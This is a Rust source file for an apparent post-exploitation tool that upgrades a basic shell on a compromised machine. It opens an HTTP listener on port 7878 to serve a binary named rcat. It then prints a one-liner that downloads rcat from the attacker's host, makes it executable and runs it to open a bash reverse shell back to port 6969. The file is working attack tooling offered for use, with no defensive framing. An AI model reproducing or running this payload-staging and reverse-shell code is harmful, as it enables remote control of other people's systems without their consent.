
use async_std::{task, fs};
use futures::executor::block_on;
use futures::select;
use rayon::prelude::*;
use std::fs::read_to_string;
use std::io::{Read, Write, BufReader, BufRead};
use std::net::{TcpStream, TcpListener, Shutdown};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Output, Stdio};
use std::thread;
use std::time::Duration;
use local_ip_address::local_ip;


fn main() {
    block_on(async_main());
}
async fn async_main() {
    println!(
        r"
                            .-~~~~-.
                          .'         `.
                          |  R  I  P  |
  jgs                     |  Shitty   |
                          |  shells   |
                          |           |
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
    );
    let my_local_ip = local_ip().unwrap();


    println!("Enter Command to upgrade current shell:\n curl -O http://{:?}:7878/rcat && chmod +x ./rcat && ./rcat connect -s bash {} 6969", my_local_ip, my_local_ip);
    
        let listener = TcpListener::bind("0.0.0.0:7878").unwrap();
        
        for stream in listener.incoming() {
            let stream = stream.unwrap();
            // Warning: This is not concurrent!
            handle_connection(stream).await;
            break;
        }
   
        
}


async fn handle_connection(mut stream: TcpStream) {
    let buf_reader = BufReader::new(&mut stream);
    let request_line = buf_reader.lines().next().unwrap().unwrap();

    if request_line == "GET /rcat HTTP/1.1" {
        let status_line = "HTTP/1.1 200 OK";
        let contents = fs::read("src/rcat").await.unwrap();
        let length = contents.len();

        let response = format!(
            "{status_line}\r\nContent-Length: {length}\r\n\r\n"
        );

        stream.write_all(response.as_bytes()).unwrap();
        stream.write_all(&contents).unwrap();
    } else {
        // some other request
    }
   
    stream.flush().unwrap();

    stream.shutdown(Shutdown::Both).unwrap();
    
}